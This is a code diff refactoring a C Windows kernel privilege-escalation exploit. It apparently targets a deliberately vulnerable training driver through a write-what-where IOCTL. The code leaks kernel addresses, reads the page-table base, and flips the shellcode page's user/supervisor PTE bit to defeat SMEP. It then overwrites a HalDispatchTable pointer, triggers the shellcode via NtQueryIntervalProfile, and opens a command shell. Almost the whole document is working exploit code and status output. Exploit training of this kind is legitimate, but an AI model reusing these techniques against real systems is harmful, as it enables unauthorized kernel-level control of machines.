@@ -10,6 +10,7 @@
 	NOTE: This corrupts the PTE table  but doesn't not bypass KCfg
 */
 
+// Note(): These offsets might not reflect the current Windows 10 version you are using.
 #define PTE_ADDRESS 0x081648
 #define KUSER_SHARED_DATA 0xFFFFF78000000000
 #define HALDISPATCHTABLE 0x339230
@@ -31,12 +32,6 @@ const unsigned char payload[] = {
     "\xC3"                                              // ret                 ; Done!
 };
 
-
-/*
-const unsigned char payload[] = {
-    "\x90\x90\x90\x90"
-};
-*/
 struct write_what_where
 {
     void *what;
@@ -44,8 +39,12 @@ struct write_what_where
 };
 
 typedef NTSTATUS(WINAPI *NtQueryIntervalProfile_t)(IN ULONG ProfileSource, OUT unsigned long long *Interval);
-
-void function();
+bool ExecuteShellcodeByNtQueryIntervalProfile();
+void OverwriteFunPtrOnHalDispatchTable(LPVOID kernelAddress,void *ptr,HANDLE driverHandle);
+void OverridePTESuperVisorControlBits(void *shellcodePTEBitsPtr, unsigned long long *PTEAddressPTR, HANDLE driverHandle);
+unsigned long long *GetPTEControlBits(unsigned long long *PTEAddressPTR, HANDLE driverHandle);
+unsigned long long *CalculateMemoryAddressPTEAddress(unsigned long long *memoryAddressPtr, unsigned long long *pteBase, HANDLE driverHandle);
+unsigned long long *GetPTEBase(unsigned long long* kernelAddress, HANDLE driverHandle);
 struct write_what_where SendToDriver(HANDLE deviceHandle,int IOCode, void* what, void* where);
 LPVOID FindBaseAddressOfNtoKrnl();
 HANDLE InitDriver();
@@ -53,16 +52,11 @@ void ShowError();
 
 int main()
 {
+    bool executeSuccess = false;
     void *ptr = NULL;
     int shellCodeLen=0;
     LPVOID kernelAddress=NULL;
-    unsigned long long *NTMiGetAddress= NULL;
-    unsigned long long *pteBase = NULL;
     HANDLE driverHandle=NULL;
-    unsigned long long *jmpRSI = NULL;
-    unsigned char rawShellcode[] = {
-        0x48,0x89,0xce,0xc3
-    };
 
     driverHandle = InitDriver();
 
@@ -80,22 +74,10 @@ int main()
 
         if (kernelAddress)
         {
-            struct write_what_where pte_results = {}; 
-            void *where = NULL;
             unsigned long long* pteBase = 0;
-            unsigned long long *pteBase2 = 0;
-            unsigned long long PTEAddress=0;
             unsigned long long *PTEAddressPTR=0;
-
-            unsigned long long firstShellcode = 0;
             void *shellcodePTEBitsPtr=NULL;
-            void *movRSIfunction = NULL;
 
-            unsigned long long shellcodePTEControlBitsKernel = 0;
-
-            unsigned long long *halDispatchTableBaseAdr= 0;
-            unsigned long long *halDispatchTable = 0;
-        
 
             printf("[+] Found Kernel leak!\n");
             printf("[+] Found ntokrnl.exe base address: %p!\n", kernelAddress);
@@ -104,97 +86,31 @@ int main()
                 Phase 1: Grab the base of the PTE via nt!MiGetAddress 
             */
 
-            NTMiGetAddress = (unsigned long long*)( ((unsigned long long)kernelAddress) + 0x00081648 );
-
-            printf("[+] nt!MiGetPteAddress is located at: %p!\n",NTMiGetAddress );
-
-            pteBase = (unsigned long long*) ((unsigned long long)NTMiGetAddress + (unsigned long long) 0x13);
-
-            printf("[+] nt!MiGetPteAddress+0x13 is located at: %p!\n",pteBase);
-            where = VirtualAlloc(0,sizeof(void*), 0x3000,0x40); 
-
-            pte_results = SendToDriver(driverHandle,0x0022200B,  pteBase, where);
-
-            pteBase = (unsigned long long*) where;
-            pteBase2 = (unsigned long long*) *pteBase;
-
-            printf("[+] Leak base of PTEs!\n");
-            printf("[+] Base of PTEs are located at: %p\n",  where ); 
+            pteBase =  GetPTEBase((unsigned long long*)kernelAddress, driverHandle);
 
             /*
                 Phase 2: Calculate the shellcode's PTE address
             */
-            PTEAddress = ( (unsigned long long) (unsigned long long*) ptr) >> 9;
-            PTEAddress &= 0x7ffffffff8;
-            PTEAddress +=  *pteBase;
-
-            PTEAddressPTR = (unsigned long long*) PTEAddress;
-
-            printf("[+] PTE Address is located at %p\n",PTEAddressPTR );
+            PTEAddressPTR = CalculateMemoryAddressPTEAddress((unsigned long long*)ptr, (unsigned long long*)pteBase,driverHandle);
 
             /* 
                 Phase 3: Extract shellcode's PTE control bits
             */
-            shellcodePTEBitsPtr = VirtualAlloc(0,sizeof(void*), 0x3000,0x40); 
-            SendToDriver(driverHandle,0x0022200B,PTEAddressPTR,shellcodePTEBitsPtr);
+            shellcodePTEBitsPtr = GetPTEControlBits(PTEAddressPTR,driverHandle);
 
-            printf("[+] PTE control bits for shellcode memory page: %llx\n",*((unsigned long long*)shellcodePTEBitsPtr));
-            printf("[!] Press any key to override PTE user control bit with supervisor control bits\n");
-           
             getchar();
             /*
                 Phase 4: Overwrite current PTE U/S for shellcode page an S (Supervisor Kernel)
             */
-            shellcodePTEControlBitsKernel = (*((unsigned long long*) shellcodePTEBitsPtr)) - 4;
-
-            shellcodePTEControlBitsKernel &= 0x0FFFFFFFFFFFFFFF;
-
-            printf("[+] Goodbye SMEP ... \n");
-            printf("[+] Overwriting shellcodes PTE user control bit with a supervisor control bits\n");
-
-
-
-            SendToDriver(driverHandle,0x0022200B, &shellcodePTEControlBitsKernel,PTEAddressPTR);
-
-            printf("[+] User mode shellcode page is now a kernel mode page!\n");
+            
+            OverridePTESuperVisorControlBits(shellcodePTEBitsPtr,PTEAddressPTR,driverHandle);
             /*
                 Phase 5: Shellcode
             */
             
-            halDispatchTableBaseAdr = (unsigned long long*) (((unsigned long long)kernelAddress+HALDISPATCHTABLE) );
-            halDispatchTable = (halDispatchTableBaseAdr) + 0x1;//0x0000000000000001;
+            OverwriteFunPtrOnHalDispatchTable(kernelAddress,ptr,driverHandle);
 
-
-            printf("[!] Before editing the HalDispatch Table\n");
-            getchar();
-
-            printf("[+] nt!DispatchTable + 0x8 is located at %p\n",halDispatchTable );
-            printf("[+] nt!HalDispatchTable edited\n");
-
-            SendToDriver(driverHandle,0x0022200B,(void*) &ptr, halDispatchTable);
-            printf("[!] After editing the HalDispatch Table\n");
-           
-            unsigned long long intv = 0;
-            NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(
-									GetModuleHandle(
-									TEXT("ntdll.dll")),
-									"NtQueryIntervalProfile"
-									);
-
-            if (NtQueryIntervalProfile)
-            {
-
-                printf("[!] Press any key to execute!\n");
-                getchar();
-                printf("[+] Interacting with the driver...\n");
-    
-                NtQueryIntervalProfile(0x1234,&intv);
-                printf("[+] Success? Work?\n");
-                system("cmd.exe /c cmd.exe /K cd C:\\");
-            } else {
-                printf("[-] could not call NTQueryIntervalProfile\n");
-            }
-            
+            executeSuccess =  ExecuteShellcodeByNtQueryIntervalProfile();
 
         } else {
             printf("[-] Could not get Kernel Base address.\n");
@@ -263,3 +179,121 @@ void ShowError()
     printf("[-] %s", errorMessageBuffer);
 }
 
+unsigned long long *GetPTEBase(unsigned long long* kernelAddress, HANDLE driverHandle)
+{
+    unsigned long long *NTMiGetAddress= NULL;
+    unsigned long long *pteBase = 0;
+    void *where = NULL;
+
+    // Get the NTMIGetAddress's Address in the kernel
+    NTMiGetAddress = (unsigned long long*)( ((unsigned long long)kernelAddress) + 0x00081648 );
+
+    printf("[+] nt!MiGetPteAddress is located at: %p!\n",NTMiGetAddress );
+
+    //Get the PTEBase
+    pteBase = (unsigned long long*) ((unsigned long long)NTMiGetAddress + (unsigned long long) 0x13);
+
+    printf("[+] nt!MiGetPteAddress+0x13 is located at: %p!\n",pteBase);
+    
+    //Allocate memory for PTE Address 
+    where = VirtualAlloc(0,sizeof(void*), 0x3000,0x40); 
+
+    SendToDriver(driverHandle,0x0022200B,  pteBase, where);
+
+    pteBase = (unsigned long long*) where;
+
+    return  pteBase;
+
+}
+
+unsigned long long *CalculateMemoryAddressPTEAddress(unsigned long long *memoryAddressPtr, unsigned long long *pteBase, HANDLE driverHandle)
+{
+    unsigned long long PTEAddress=0;
+    unsigned long long *PTEAddressPTR=0;
+
+
+    PTEAddress = ( (unsigned long long) (unsigned long long*) memoryAddressPtr) >> 9;
+    PTEAddress &= 0x7ffffffff8;
+    PTEAddress +=  *pteBase;
+
+    PTEAddressPTR = (unsigned long long*) PTEAddress;
+
+    printf("[+] PTE Address is located at %p\n",PTEAddressPTR );
+
+    return PTEAddressPTR;
+}
+
+unsigned long long *GetPTEControlBits(unsigned long long *PTEAddressPTR, HANDLE driverHandle)
+{
+    void *shellcodePTEBitsPtr=NULL;
+
+    shellcodePTEBitsPtr = VirtualAlloc(0,sizeof(void*), 0x3000,0x40); 
+    SendToDriver(driverHandle,0x0022200B,PTEAddressPTR,shellcodePTEBitsPtr);
+
+    printf("[+] PTE control bits for shellcode memory page: %llx\n",*((unsigned long long*)shellcodePTEBitsPtr));
+    printf("[!] Press any key to override PTE user control bit with supervisor control bits\n");
+
+    return (unsigned long long*)shellcodePTEBitsPtr;
+}
+
+void OverridePTESuperVisorControlBits(void *shellcodePTEBitsPtr, unsigned long long *PTEAddressPTR ,HANDLE driverHandle)
+{
+    unsigned long long shellcodePTEControlBitsKernel = 0;
+
+    shellcodePTEControlBitsKernel = (*((unsigned long long*) shellcodePTEBitsPtr)) - 4;
+
+    shellcodePTEControlBitsKernel &= 0x0FFFFFFFFFFFFFFF;
+
+    printf("[+] Goodbye SMEP ... \n");
+    printf("[+] Overwriting shellcodes PTE user control bit with a supervisor control bits\n");
+
+    SendToDriver(driverHandle,0x0022200B, &shellcodePTEControlBitsKernel,PTEAddressPTR);
+
+    printf("[+] User mode shellcode page is now a kernel mode page!\n");
+}
+
+void OverwriteFunPtrOnHalDispatchTable(LPVOID kernelAddress,void *ptr,HANDLE driverHandle)
+{
+    unsigned long long *halDispatchTableBaseAdr= 0;
+    unsigned long long *halDispatchTable = 0;
+
+    halDispatchTableBaseAdr = (unsigned long long*) (((unsigned long long)kernelAddress+HALDISPATCHTABLE) );
+    halDispatchTable = (halDispatchTableBaseAdr) + 0x1;//0x0000000000000001;
+
+
+    printf("[!] Before editing the HalDispatch Table\n");
+    getchar();
+
+    printf("[+] nt!DispatchTable + 0x8 is located at %p\n",halDispatchTable );
+    printf("[+] nt!HalDispatchTable edited\n");
+
+    SendToDriver(driverHandle,0x0022200B,(void*) &ptr, halDispatchTable);
+    printf("[!] After editing the HalDispatch Table\n");
+}
+
+bool ExecuteShellcodeByNtQueryIntervalProfile()
+{
+    unsigned long long intv = 0;
+    NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(
+                            GetModuleHandle(
+                            TEXT("ntdll.dll")),
+                            "NtQueryIntervalProfile"
+                            );
+
+    if (NtQueryIntervalProfile)
+    {
+
+        printf("[!] Press any key to execute!\n");
+        getchar();
+        printf("[+] Interacting with the driver...\n");
+
+        NtQueryIntervalProfile(0x1234,&intv);
+        printf("[+] Success? Work?\n");
+        system("cmd.exe /c cmd.exe /K cd C:\\");
+        return true;
+    } else {
+        printf("[-] could not call NTQueryIntervalProfile\n");
+        return false;
+    }
+    return true;
+}
